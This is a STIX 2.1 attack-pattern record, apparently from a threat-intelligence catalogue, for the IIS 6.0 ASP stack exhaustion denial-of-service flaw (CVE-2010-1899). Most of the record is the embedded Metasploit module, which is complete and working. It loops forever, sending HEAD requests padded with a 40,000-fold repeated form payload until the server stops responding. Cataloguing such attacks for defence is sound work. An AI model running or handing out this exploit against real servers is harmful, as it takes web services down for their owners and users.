{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--effa7879-3b8e-403a-b4c0-62cc34c06449",
    "created": "2024-08-14T16:25:31.179761Z",
    "modified": "2024-08-14T16:25:31.179766Z",
    "name": "Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service",
    "description": " The vulnerability allows remote unauthenticated attackers to force the IIS server to become unresponsive until the IIS service is restarted manually by the administrator. Required is that Active Server Pages are hosted by the IIS and that an ASP script reads out a Post Form value. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/http/ms10_065_ii6_asp_dos.rb",
            "external_id": "ms10_065_ii6_asp_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1899"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service',\n      'Description'    => %q{\n          The vulnerability allows remote unauthenticated attackers to force the IIS server\n        to become unresponsive until the IIS service is restarted manually by the administrator.\n        Required is that Active Server Pages are hosted by the IIS and that an ASP script reads\n        out a Post Form value.\n      },\n      'Author'         =>\n        [\n          'Heyder Andrade <heyder[at]alligatorteam.org>',\n          'Leandro Oliveira <leadro[at]alligatorteam.org>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1899' ],\n          [ 'OSVDB', '67978'],\n          [ 'MSB', 'MS10-065'],\n          [ 'EDB', '15167' ]\n        ],\n      'DisclosureDate' => '2010-09-14'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('VHOST', [ false, 'The virtual host name to use in requests']),\n        OptString.new('URI', [ true, 'URI to request', '/page.asp' ])\n      ])\n  end\n\n\n  def run\n    uri = datastore['URI']\n    print_status(\"Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{uri}\")\n\n    begin\n      while(1)\n        begin\n          connect\n          payload = \"C=A&\" * 40000\n          length = payload.size\n          sploit = \"HEAD #{uri} HTTP/1.1\\r\\n\"\n          sploit << \"Host: #{datastore['VHOST'] || rhost}\\r\\n\"\n          sploit << \"Connection:Close\\r\\n\"\n          sploit << \"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n          sploit << \"Content-Length:#{length} \\r\\n\\r\\n\"\n          sploit << payload\n          sock.put(sploit)\n          #print_status(\"DoS packet sent.\")\n          disconnect\n        rescue Errno::ECONNRESET\n          next\n        end\n      end\n    rescue Errno::EPIPE\n      print_good(\"IIS should now be unavailable\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-14"
}